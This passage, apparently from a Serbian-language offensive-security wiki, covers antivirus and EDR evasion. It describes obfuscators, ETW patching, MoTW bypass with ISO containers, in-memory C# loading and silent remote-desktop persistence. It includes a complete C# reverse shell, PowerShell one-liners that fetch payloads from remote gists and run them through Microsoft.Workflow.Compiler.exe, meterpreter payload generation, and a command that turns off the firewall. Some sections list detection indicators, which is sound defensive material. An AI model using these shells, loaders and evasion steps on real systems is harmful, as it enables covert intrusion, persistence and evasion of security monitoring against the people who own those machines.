> 🛈  ConfuserEx kreira prilagođeni atribut pod nazivom `ConfusedByAttribute`, koji može da se koristi kao IOC za automatsku trijažu uzoraka.

#### Jednolinijski код
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Cilj ovog projekta je da pruži open-source fork LLVM kompilacionog paketa koji omogućava veću bezbednost softvera pomoću [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) i zaštite od neovlašćenih izmena.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator pokazuje kako se jezik `C++11/14` može koristiti za generisanje obfusciranog koda u vreme kompilacije, bez spoljnog alata i bez menjanja kompilatora.
- [**obfy**](https://github.com/fritzone/obfy): Dodaje sloj obfusciranih operacija generisanih C++ template metaprogramming framework-om, čime se osobi koja želi da crack-uje aplikaciju posao donekle otežava.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz je x64 binary obfuscator koji može da obfuscira različite PE datoteke, uključujući: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame je jednostavan metamorphic code engine za proizvoljne izvršne datoteke.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator je framework za detaljnu code obfuscation za jezike koje podržava LLVM, koristeći ROP (return-oriented programming). ROPfuscator obfuscira program na nivou assembly koda tako što regularne instrukcije pretvara u ROP lance, čime narušava našu uobičajenu predstavu o normalnom toku kontrole.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt je .NET PE Crypter napisan u Nim-u
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor može da konvertuje postojeće EXE/DLL datoteke u shellcode, a zatim ih učita

### LLVM compiler-assisted per-function self-masking

Umesto da maskira ceo implant samo dok miruje, izmenjeni LLVM X86 backend može da drži odabrane funkcije XOR-maskiranim kad god nisu aktivne. Function Peekaboo PoC bira demangled imena koja sadrže `REG_`, umeće position-independent entry/exit stubs oko završnog machine code-a i emituje jedan zajednički masking handler u `.text`; potpisi na nivou izvornog koda i Windows x64 calling convention ostaju nepromenjeni.<sup>[[38]](#references)[[39]](#references)</sup>

#### Backend control-flow transformation

Ovo treba primeniti nakon instruction selection i optimizacije, jer transformacija mora da obuhvati **svako emitovano vraćanje** i da zna tačan x86 raspored. `MachineFunctionPass` koji se izvršava pre emitovanja pronalazi poslednji `MachineInstr::isReturn()`, uklanja ga kako bi se završna putanja nastavila u dodatni epilogue i zamenjuje ranija vraćanja sa `JMP_1 handler`. Zadržite svako compiler-generated rastavljanje stack/frame-a koje prethodi vraćanju; preusmerite samo samu instrukciju za vraćanje.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` i `emitFunctionBodyEnd()` emituju stubove za pojedinačne funkcije, dok `emitEndOfAsmFile()` emituje handler. Simboli koji se dele između faza emitovanja omogućavaju da prologue grana ka kasnije emitovanom epilogue-u; za ručno emitovan near `je`, upišite `0F 84`, a zatim četvorobajtni MC izraz `target - address_after_je`. Pozivi i skokovi ka handler-u mogu se umesto toga emitovati kao `MCInst` objekti (`CALL64pcrel32` i `JMP_1`). Pass mora da vrati `false` za neizabranu funkciju ako nije ništa promenio; PoC pogrešno vraća `true` u tom slučaju.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadata i pre-CRT inicijalizacija

PoC smešta XOR ključ i zapise od 16 bajtova, koji sadrže pokazivač na funkciju relociran od strane loader-a i dužinu određenu u runtime-u, u `.funcmeta`. Iako je C polje `uint32_t`, handler pristupa QWORD vrednosti na pomeraju `+8` u zapisu, čime obuhvata dužinu i njeno padding polje, a zapise obrađuje u koracima od `0x10`. Imena PE sekcija zauzimaju samo osam bajtova, pa runtime pretraga vidi `.funcmet`. Spoljni patcher dodaje izvršni `.stub`, čuva stari RVA entry point-a u stub-u i preusmerava `AddressOfEntryPoint`; PIC stub dobija image base iz `gs:[0x60]` → `[PEB+0x10]`, prolazi kroz PE32+ imports kako bi pronašao već importovani `VirtualProtect` i pokreće se pre CRT-a.<sup>[[38]](#references)[[39]](#references)</sup>

Inicijalizacija postavlja sentinel u `gs:[0xE8]` i poziva svaku funkciju iz metadata-e. Njihov prologue, koji je trajno čitljiv, beleži početak funkcije u `gs:[0xF0]`, detektuje sentinel i preskače telo koje je i dalje dešifrovano. Epilogue zatim koristi `call handler`; nakon što handler sačuva 13 registara (`0x68` bajtova), povratna adresa na `[rsp+0x68]` predstavlja kraj transformisane funkcije, pa se `end - start` može upisati u njen metadata zapis. Stub uklanja sentinel i skače na `ImageBase + original_entry_point_RVA` nakon što su sva tela maskirana.<sup>[[38]](#references)[[39]](#references)</sup>

Tokom uobičajenog poziva, prologue poziva isti simetrični handler da bi dekodirao telo. Završna putanja se nastavlja u dodatni epilogue, dok svako ranije vraćanje skače direktno do zajedničkog handler-a. Uobičajeni epilogue takođe koristi `jmp handler` umesto `call`, pa nakon ponovnog maskiranja `ret` instrukcija handler-a preuzima povratnu adresu originalnog pozivaoca i čuva rezultat funkcije u `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Masking primitive i indikatori analize

Handler pronalazi trenutni zapis, preskače fiksni vidljivi prologue (`0x46` bajtova u ovoj verziji), menja ostatak u `PAGE_EXECUTE_READWRITE`, XOR-uje svaki bajt donjim bajtom ključa, a zatim postavlja zaštitu na `PAGE_EXECUTE_READ`. Ista petlja zato dekodira pri ulasku i kodira pri svakom uobičajenom izlasku.<sup>[[38]](#references)[[39]](#references)</sup>

Indikatori ovog dizajna sa visokim signalom uključuju:<sup>[[38]](#references)[[39]](#references)</sup>

- entry point unutar izvršnog `.stub` i sekciju `.funcmet` koja sadrži ključ i relocirane pokazivače u `.text`;
- PEB, import-table i section-table parsiranje pre CRT-a, a zatim pozive preko svakog pokazivača iz metadata-e;
- identične PIC prologue sekvence `call`/`pop` i mnogo mesta za vraćanje preusmerenih ka jednom handler-u;
- upise u `gs:[0xE8]`, `gs:[0xF0]` i `gs:[0xF8]`, praćene ponovljenim `VirtualProtect` promenama zaštite i bajtovskim XOR upisima u izvršne stranice koje su podržane image-om.

Ovo je izbegavanje memory scanner-a, a ne kriptografska zaštita: zakrpljena datoteka i dalje sadrži originalno, dešifrovano telo, a debugger može da postavi breakpoint na `VirtualProtect` ili XOR petlju i preuzme aktivnu funkciju. Jednobajtni XOR, čitljiva metadata i fiksna granica `0x46` takođe omogućavaju jednostavan offline oporavak.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> TEB slotovi u PoC-u specifični su za thread, ali izmenjene code pages važe za ceo process. Zato konkurentan ili rekurzivan ulazak može ponovo da preklopi instrukcije dok ih izvršava drugi poziv; exceptions i nonlocal exits takođe mogu da zaobiđu ponovno maskiranje. Robusna implementacija mora da sinhronizuje promene, vrati zaštitu koju je zaista vratio `lpflOldProtect`, izbegne hard-coded stub lengths, proveri stack alignment x64 za putanje `call` и `jmp` i pozove `FlushInstructionCache` nakon prepisivanja izvršnih bajtova. Microsoft izričito navodi da je caller odgovoran za usklađenost instruction cache-a kada se izvršni kod menja.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

Možda ste videli ovaj ekran prilikom preuzimanja nekih izvršnih datoteka sa interneta i njihovog pokretanja.

Microsoft Defender SmartScreen je bezbednosni mehanizam namenjen zaštiti krajnjeg korisnika od pokretanja potencijalno zlonamernih aplikacija.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen uglavnom koristi pristup zasnovan na reputaciji, što znači da će aplikacije koje se retko preuzimaju pokrenuti SmartScreen, koji će upozoriti krajnjeg korisnika i sprečiti ga da pokrene datoteku (mada je datoteku i dalje moguće pokrenuti klikom na More Info -> Run anyway).

**MoTW** (Mark of The Web) je [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) pod nazivom Zone.Identifier, koji se automatski kreira prilikom preuzimanja datoteka sa interneta, zajedno sa URL-om sa kog su preuzete.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Provera Zone.Identifier ADS-a za datoteku preuzetu sa interneta.</p></figcaption></figure>

> [!TIP]
> Važno je napomenuti da izvršne datoteke potpisane **pouzdanim** sertifikatom za potpisivanje **neće pokrenuti SmartScreen**.

Veoma efikasan način da sprečite da vaši payload-i dobiju Mark of The Web jeste da ih zapakujete u neki tip kontejnera, kao što je ISO. To je zato što Mark-of-the-Web (MOTW) **ne može** da se primeni na volumene koji **nisu NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) je alat koji pakuje payload-e u izlazne kontejnere kako bi izbegao Mark-of-the-Web.

Primer upotrebe:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Ovo je demonstracija za zaobilaženje SmartScreen-a pakovanjem payload-a u ISO datoteke pomoću [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) je moćan mehanizam za beleženje događaja u Windows-u koji aplikacijama i komponentama sistema omogućava da **beleže događaje**. Međutim, bezbednosni proizvodi mogu da ga koriste i za nadgledanje i otkrivanje zlonamernih aktivnosti.

Slično onemogućavanju (zaobilaženju) AMSI-ja, moguće je podesiti da funkcija **`EtwEventWrite`** korisničkog procesa odmah vrati kontrolu, bez beleženja događaja. To se postiže izmenom funkcije u memoriji tako da odmah vrati kontrolu, čime se efektivno onemogućava ETW beleženje za taj proces.

Više informacija možete pronaći u tekstovima **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) i [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

Učitavanje C# binarnih datoteka u memoriju poznato je već duže vreme i i dalje je veoma dobar način za pokretanje post-exploitation alata bez otkrivanja od strane AV-a.

Pošto će se payload učitati direktno u memoriju, bez upisa na disk, potrebno je samo da vodimo računa o zakrpljivanju AMSI-ja za ceo proces.

Većina C2 okvira (sliver, Covenant, metasploit, CobaltStrike, Havoc itd.) već omogućava izvršavanje C# sklopova direktno u memoriji, ali postoji nekoliko načina da se to uradi:

- **Fork\&Run**

Ovaj pristup podrazumeva **pokretanje novog žrtvenog procesa**, ubacivanje post-exploitation zlonamernog koda u taj proces, njegovo izvršavanje i gašenje procesa po završetku. Ovaj pristup ima i prednosti i nedostatke. Prednost fork and run metode je u tome što se izvršavanje odvija **izvan** procesa našeg Beacon implant-a. To znači da postoji **mnogo veća verovatnoća** da će naš **implant preživeti** ako nešto pođe po zlu tokom post-exploitation aktivnosti ili bude otkriveno. Nedostatak je **veća verovatnoća** da će nas otkriti **bihevioralne detekcije**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Ovaj pristup podrazumeva ubacivanje post-exploitation zlonamernog koda **u sopstveni proces**. Tako možete da izbegnete kreiranje novog procesa i njegovo skeniranje od strane AV-a, ali ako nešto pođe po zlu tokom izvršavanja payload-a, postoji **mnogo veća verovatnoća** da ćete **izgubiti svoj beacon**, jer proces može da se sruši.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ako želite da saznate više o učitavanju C# sklopova, pogledajte ovaj članak [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) i njihov InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

C# sklopove možete učitavati i **iz PowerShell-a**. Pogledajte [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) i [video S3cur3th1sSh1t-a](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## NativeAOT WebAssembly prepakovanje .NET alata (WasmForge)

Uobičajene tehnike `execute-assembly` zadržavaju prepoznatljivi MSIL i na kraju pokreću CLR. **WasmForge** umesto toga menja osnovu izvršavanja: migrira C# projekat na eksperimentalni NativeAOT-LLVM WASI target, unapred ga kompajlira u WebAssembly i ugrađuje taj modul u Windows PE host zasnovan na Wazero-u. Dobijeni proces ne zahteva CLR, JIT niti `dotnet` host na ciljnom sistemu, pa pravila zasnovana isključivo na nazivima upravljanih sklopova, učitavanju CLR-a, AMSI-ju ili .NET ETW-u gube direktnu vidljivost. Ovo je tehnika za izbegavanje detekcije i pakovanje, a ne zaobilaženje granice privilegija — guest zadržava dozvole originalnog alata i njegovo vidljivo ponašanje u OS-u.<sup>[[44]](#references)[[45]](#references)</sup>

### Izgradnja C# projekta

Preporučeni način izgradnje koristi Docker okruženje projekta, koje uključuje .NET 10 SDK, NativeAOT-LLVM workload, WASI SDK 24.0, linker i zavisnosti za potpisivanje. `.csproj` datoteka se automatski prepoznaje; jednokratna izgradnja obavlja migraciju, zakrpljivanje kompatibilnosti, WASM kompilaciju, izradu PE datoteke i potpisivanje.<sup>[[45]](#references)</sup>

```bash
# From the WasmForge repository
make docker-build
make docker-run DOCKER_SRC=/path/to/Seatbelt DOCKER_PROJECT=seatbelt

# Equivalent direct build when all prerequisites are installed
GOOS=windows GOARCH=amd64 ./wasmforge build --win32-apis \
  -o seatbelt.exe /path/to/Seatbelt/Seatbelt/
```

Za otklanjanje problema ili pregled generisanog koda, podelite proces na `wasmforge dotnet-migrate <dir>`, `wasmforge dotnet-patch <dir>`, `dotnet publish -c Release -r wasi-wasm` i završni `wasmforge build --wasm <module> --nativeaot --win32-apis -o <output.exe>`. Build image koristi i omotač `wasm-component-ld` da bi izbegao kodiranje WASI Preview 2 komponente i proizveo običan modul koji očekuje ugrađeni runtime.<sup>[[44]](#references)[[45]](#references)</sup>

### Povezivanje wasm32 C# koda sa x64 Win32

Ovo nije transparentno ponovno prevođenje. NativeAOT-WASI nema Windows-orijentisane BCL funkcionalnosti ili ih menja, a wasm32 guest obično alocira četvorobajtne slotove za pokazivače, dok x64 API-ji mogu da vrate osmobajtne pokazivače. WasmForge rešava oba problema pomoću sledećih generisanih slojeva:<sup>[[44]](#references)</sup>

1. Source patcher ispravlja semantičke razlike specifične za AOT i preusmerava nepodržane pozive ka registru, pipe-ovima, WMI-ju, identitetu, directory service-u, verziji datoteka, LSA-u i sličnim funkcijama na `Wf*` pomoćne funkcije.
2. P/Invoke scanner generiše NativeAOT `DirectPInvoke` mapiranja tako da se pozivi `[DllImport]` povezuju sa povezanim C bridge simbolima, umesto da se deklarisani DLL dinamički učitava unutar guest-a.
3. Pokazivači vezani za host koriste `ulong` u C# i `uint64_t` u C-u. Generički dispatcher prosleđuje poziv host-ovom Win32 handler-u; `out8_mask` označava stvarne osmobajtne izlazne slotove čije gornje polovine moraju da se sačuvaju. Za neoznačene izlaze u obliku wasm32 koristi se zaštita snapshot/restore kako upis x64 vrednosti ne bi oštetio susedna četiri bajta.
4. Namenski host bridge-ovi obrađuju operacije koje se ne uklapaju u generički syscall dispatch, kao što su pristup LSA ticket cache-u, Kerberos/BCrypt operacije sa strukturiranim rezultatima, TCP KDC saobraćaj i LDAP upiti.

Na primer, omotač za `version.dll!VerQueryValueW` prosleđuje četiri host adrese i postavlja bitove 2 i 3 (`0xC`), jer su pokazivač na vrednost i dužina osmobajtni izlazni slotovi. Sam omotač ostaje generički i prosleđuje ime DLL-a, ime export-a, argumente i masku funkciji `wf_call_v2`; host obavlja prevođenje pokazivača i poziva nativni API.<sup>[[44]](#references)</sup>

```c
uint32_t version_VerQueryValueW_v2(uint64_t block, uint64_t subblock,
    uint64_t value_out, uint64_t length_out) {
    return (uint32_t)wf_call_v2("version.dll", "VerQueryValueW", 4,
        0xC, block, subblock, value_out, length_out);
}
```

### Ograničenja i indikatori za detekciju

Kod koji se intenzivno oslanja na reflection, dinamičko učitavanje assembly-ja, proizvoljne native callback funkcije i složene x64 strukture vraćene u WASM memoriju i dalje može zahtevati zakrpe specifične za svaki alat ili potpuno otkazati. Generički WASI Preview 2 sockets takođe mogu stići do no-op stubova, pa podržani alati koriste host shim-ove specifične za protokol. Proverite svaku komandu u odnosu na native build, umesto da pretpostavljate da su funkcionalnosti jednake.<sup>[[44]](#references)[[45]](#references)</sup>

Ova tehnika preusmerava telemetriju, umesto da payload učini nevidljivim. Detekcija se može usmeriti na PE koji sadrži ili materijalizuje WASM modul, ponašanje runtime-a sličnog Wazero-u, neuobičajenu alokaciju i kopiranje host/guest memorije, generičko direktno pozivanje Win32 funkcija, anomalije u potpisivanju i PE resursima, kao i na rezultatne API pozive i mrežni saobraćaj. Zato odsustvo CLR-load, AMSI ili .NET ETW događaja ne treba smatrati dokazom da je proces bezopasan.<sup>[[44]](#references)</sup>

## Korišćenje drugih programskih jezika

Kao što je predloženo u [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), moguće je izvršiti zlonamerni kod pomoću drugih jezika tako što se kompromitovanoj mašini omogući pristup **okruženju interpretera instaliranom na SMB share-u pod kontrolom napadača**.

Omogućavanjem pristupa interpreter binary datotekama i okruženju na SMB share-u možete **izvršavati proizvoljan kod u ovim jezicima u memoriji** kompromitovane mašine.

U repozitorijumu se navodi: Defender i dalje skenira skripte, ali korišćenjem Go, Java, PHP itd. imamo **više fleksibilnosti za zaobilaženje statičkih potpisa**. Testiranje nasumičnih, neobfuskovanih reverse shell skripti u ovim jezicima pokazalo se uspešnim.

## WebAssembly re-hosting za izbegavanje statičke analize

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

Token stomping manipuliše access token-om bezbednosnog proizvoda kao što je EDR ili AV. Smanjenje privilegija token-a može omogućiti da proces nastavi da radi, ali ga sprečiti da obavlja privilegovane radnje inspekcije ili sanacije.

Da bi se to sprečilo, Windows bi mogao da **spreči spoljne procese** da dobiju handles nad token-ima bezbednosnih procesa.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Korišćenje pouzdanog softvera

### Chrome Remote Desktop

Kao što je opisano u [**ovom blog postu**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), lako je instalirati Chrome Remote Desktop na računar žrtve, a zatim ga koristiti za preuzimanje kontrole i održavanje persistence:<sup>[[35]](#references)</sup>
1. Preuzmite ga sa https://remotedesktop.google.com/, kliknite na „Set up via SSH“, a zatim kliknite na MSI datoteku za Windows da biste je preuzeli.
2. Pokrenite instalacioni program tiho na računaru žrtve (potrebna su administratorska prava): `msiexec /i chromeremotedesktophost.msi /qn`
3. Vratite se na stranicu Chrome Remote Desktop i kliknite na „Next“. Čarobnjak će zatražiti autorizaciju; kliknite na dugme „Authorize“ da biste nastavili.
4. Izvršite dostavljenu komandu uz potrebna prilagođavanja: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (parametar `--pin` postavlja PIN bez korišćenja GUI-ja).
 

## Napredno izbegavanje detekcije

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

Izbegavanje detekcije je veoma složena tema. Ponekad je potrebno uzeti u obzir mnogo različitih izvora telemetrije u jednom sistemu, pa je u zrelim okruženjima praktično nemoguće ostati potpuno neprimećen.

Svako okruženje protiv kog radite imaće sopstvene prednosti i slabosti.

Preporučujem da pogledate ovo predavanje od [@ATTL4S](https://twitter.com/DaniLJ94) da biste stekli osnovu za naprednije tehnike izbegavanja detekcije.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Ovo je još jedno odlično predavanje od [@mariuszbit](https://twitter.com/mariuszbit) o višeslojnom izbegavanju detekcije.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Stare tehnike**

### **Provera kojih delova Defender smatra zlonamernim**

Možete koristiti [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), koji će **uklanjati delove binary datoteke** dok **ne utvrdi koji deo Defender** smatra zlonamernim, a zatim ga izdvojiti za vas.\
Još jedan alat koji radi **istu stvar je** [**avred**](https://github.com/dobin/avred), koji nudi uslugu putem otvorenog web interfejsa na adresi [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet server**

Do Windows 10, svi Windows sistemi isporučivani su sa **Telnet serverom**, koji ste mogli da instalirate (kao administrator) ovako:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Neka se **pokreće** pri pokretanju sistema i **pokrenite** ga sada:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Promenite telnet port** (stealth) i onemogućite firewall:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Preuzmite ga sa: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (potrebna su vam bin preuzimanja, a ne instalacioni program)

**NA HOSTU**: Pokrenite _**winvnc.exe**_ i konfigurišite server:

- Uključite opciju _Disable TrayIcon_
- Postavite lozinku u polju _VNC Password_
- Postavite lozinku u polju _View-Only Password_

Zatim prebacite binarnu datoteku _**winvnc.exe**_ i **novokreiranu** datoteku _**UltraVNC.ini**_ na **žrtvu**

#### **Obrnuta veza**

**Napadač** treba da **pokrene na svom** **hostu** binarnu datoteku `vncviewer.exe -listen 5900` kako bi bio **spreman** da prihvati obrnutu **VNC vezu**. Zatim na **žrtvi**: Pokrenite winvnc daemon pomoću `winvnc.exe -run`, a zatim pokrenite `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**UPOZORENJE:** Da biste ostali neprimećeni, nemojte raditi sledeće:

- Nemojte pokretati `winvnc` ako je već pokrenut jer ćete aktivirati [iskačući prozor](https://i.imgur.com/1SROTTl.png). Proverite da li je pokrenut pomoću `tasklist | findstr winvnc`
- Nemojte pokretati `winvnc` bez datoteke `UltraVNC.ini` u istom direktorijumu jer će se otvoriti [prozor za konfiguraciju](https://i.imgur.com/rfMQWcf.png)
- Nemojte pokretati `winvnc -h` za pomoć jer ćete aktivirati [iskačući prozor](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Preuzmite ga sa: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

Unutar GreatSCT:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Sada **pokrenite listener** pomoću `msfconsole -r file.rc` i **izvršite** **xml payload** pomoću:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Trenutni Defender će veoma brzo prekinuti proces.**

### Kompajliranje sopstvenog reverse shell-a

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Prvi C# Revershell

Kompajlirajte ga pomoću:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Koristite ga sa:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# korišćenjem kompajlera

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatsko preuzimanje i izvršavanje:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista C# obfuskatora: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

### Primer korišćenja Python-a za pravljenje injectora:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Ostali alati

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Još

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Donesi sopstveni ranjivi drajver (BYOVD) – Gašenje AV/EDR-a iz kernel prostora

